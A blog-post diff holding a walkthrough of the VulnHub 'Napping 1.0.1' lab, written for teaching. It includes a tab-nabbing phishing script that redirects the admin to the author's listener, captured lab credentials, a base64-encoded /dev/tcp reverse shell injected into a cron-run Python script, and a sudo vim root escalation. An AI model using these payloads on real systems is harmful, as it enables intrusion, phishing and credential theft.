@@ -1,0 +1,220 @@
+---
+title: "napping 1.0.1 vulnhub writeup"
+author: "0xMesbaha"
+cover: "/media/napping/napping.jpg"
+tags: ["Vulnhub", "tab-nabbing", "phishing" ,"vim"]
+date: 2022-06-27T00:45:19+02:00
+draft: false
+---
+
+In This VulnHub Box, we are facing a relatively an interesting vulnerability which is tab-nabbing that will help us phish the admin to get his credentials which we can use to ssh into the Box , From There we can get a reverse shell from adrian user as he is running a cron job which is a python script and we can write into it because we are in the administrators group. and for the root part we have sudo privilege on vim editor.
+
+you can download the machine from [here](https://www.vulnhub.com/entry/napping-101,752/) we have the description :
+
+*Even Admins can fall asleep on the job*
+
+it indicates that some admin will make a mistake or something but let's Jump in and see ourselves. 
+
+<!--more-->
+
+First we need to get the IP of the target machine with :
+```bash
+sudo netdiscover
+```
+and I have got the IP address : ``192.168.1.12``  Let's start our process :
+
+
+## Scanning 
+```bash
+nmap -A -T4 192.168.1.12 -oN nmap.inital
+```
+
+results :
+```cmd
+Host is up (0.0062s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 24:c4:fc:dc:4b:f4:31:a0:ad:0d:20:61:fd:ca:ab:79 (RSA)
+|   256 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be (ECDSA)
+|_  256 af:01:85:cf:dd:43:e9:8d:32:50:83:b2:41:ec:1d:3b (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Login
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
+From the results we know the following :
+- the target machine is Ubuntu 
+- the Apache version running  2.4.41
+- httponly flag not set which can lead to XSS (cross site scripting)
+- we will get a login page when we visit the page
+
+Also we can do a full port scanning But with no more results 
+
+
+## Enumeration 
+Before hopping into the website let's do some basics enumeration from the terminal 
+#### Directory Busting :
+```bash
+ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt  -u http://192.168.1.12/FUZZ -o files-medium.txt -fc 403
+```
+
+Output :
+```cmd
+config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
+index.php               [Status: 200, Size: 1219, Words: 334, Lines: 38]
+logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
+welcome.php             [Status: 302, Size: 0, Words: 1, Lines: 1]
+register.php            [Status: 200, Size: 1566, Words: 434, Lines: 42]
+reset-password.php      [Status: 302, Size: 0, Words: 1, Lines: 1]
+```
+
+
+visiting the web page we got a login :
+
+![error](/media/napping/20220627113927.png)
+
+Trying some basic SQLi statements But no bypasses. so Let's create an account and see what is going on .
+
+After logging in we will be redirected to **/welcome.php** which  we have found earlier
+
+![error](/media/napping/20220627120228.png)
+
+we can try to go to the **/reset-password.php** maybe we can change the ID or the username if it was being sent with the request to admin and reset his password. But unfortunately we can't :
+
+![error](/media/napping/20220627120508.png)
+
+we can see the Enter URL and the admin will check. i have tried some wrappers (file:// and php://) But no results , However with being said admin will review it this should trigger your XSS sense.
+
+I made an empty html file and host it , then submit the link of my URL and wait to see what will happen and Look :
+
+![error](/media/napping/20220627124018.png)
+
+It seems after 2 minutes of submission the url the admin will indeed review it , so we can try to steal any useful data 
+
+However i tried a lot but no thing is getting back.
+
+![x](https://media.giphy.com/media/GlqUe0PhpAHCg/giphy.gif)
+
+Let's check the Page source code , we can see this weird target value ``_blank`` 
+
+![error](/media/napping/20220627130623.png)
+
+
+Searching for it found it is actually a [vulnerability](https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/) can open phishing scenarios , and we know the admin will visit this fake page , also from description we know even admin may made mistake so let's clone the login page (copy html code) our hope is the admin to submit his username and password
+
+## Foothold
+Following the Article steps :
+
+1- clone the Login page source code 
+
+2- add the following in the source code which the data will be redirected to 
+
+```html
+<script>window.opener.location = 'http://192.168.1.11:9090';</script>
+```
+*note: add other port rather than the http port because it is a POST request so the data submitted will not appear at the uri in the http server*
+
+3- Host the page and submit the URL
+
+and after 2 minutes we got the Juicy stuff :
+
+![error](/media/napping/20220627134313.png)
+
+now we have this credentials after URL decoding 
+``daniel:C@ughtm3napping123`` 
+
+Trying these credentials in the web page we got invalid login , trying them with the **ssh** port we have found earlier we are in finally
+
+
+![error](/media/napping/20220627134759.png)
+
+
+
+## Lateral movement
+
+First thing that have my attention is the **administrators** group , so let's check what is interesting about this group 
+
+```bash
+daniel@napping:~$ find / -group administrators  2>/dev/null
+/home/adrian/query.py
+daniel@napping:~$ ls -l /home/adrian/query.py
+-rw-rw-r-- 1 adrian administrators 481 Oct 30  2021 /home/adrian/query.py
+```
+
+nice we have write access to that folder , we can edit it but then what ? , we need also user adrian to execute it and there should be some crontab running to achieve that.
+
+However there is no crontabs under the ``/etc/crontab`` , there are other cornjobs that are under ``/var/spool/cron``  and normally only the user who owns it will be able to access it.
+
+we can upload [pspy](https://github.com/DominicBreuker/pspy) and monitor the processes running and check for such a cron job
+
+
+![error](/media/napping/20220627141335.png)
+
+and guess who is the User whose id is 1000 ?
+```bash
+daniel@napping:/tmp$ cat /etc/passwd | grep adrian
+adrian:x:1000:1000:adrian:/home/adrian:/bin/bash
+```
+
+so we can simply add our malicious piece of code in the script running by adrian and we will get a reverse shell :
+
+```bash
+import os
+os.system("echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjExLzg4ODggMD4mMQ== | base64 -d | bash")
+```
+*note we need to base64 encode the reverse shell payload as it contains some special characters will disturb the execution*
+
+![error](/media/napping/20220627142623.png)
+
+##  root Access 
+and the root part is really easy : 
+
+![error](/media/napping/20220627142726.png)
+
+```bash
+sudo /usr/bin/vim
+# press ESC then 
+```
+
+![error](/media/napping/20220627142856.png)
+
+And the machine has been pwned ;) 
+
+![error](/media/napping/20220627142914.png)
+
+
+
+## After root 
+
+Under `` /var/spool/cron/crontabs/adrian`` we can see 
+
+```bash
+*/2 * * * * /usr/bin/python3 /home/adrian/query.py
+```
+
+and under  `` /var/spool/cron/crontabs/root``
+
+```bash
+*/2 * * * * /usr/bin/python3 /root/nap.py
+```
+
+The script was checking for the opener.location in the page the admin visit and if present it will submit the data
+```python
+data = {
+        "username":"daniel",
+        "password":"C@ughtm3napping123"
+        }
+
+    elif (search.find('opener.location') != -1):
+        match = re.findall("http(.*);",search)
+        new_url = 'http' + match[0].rstrip(match[0][-1])
+        r2 = requests.post(new_url,data=data,timeout=2)
+```
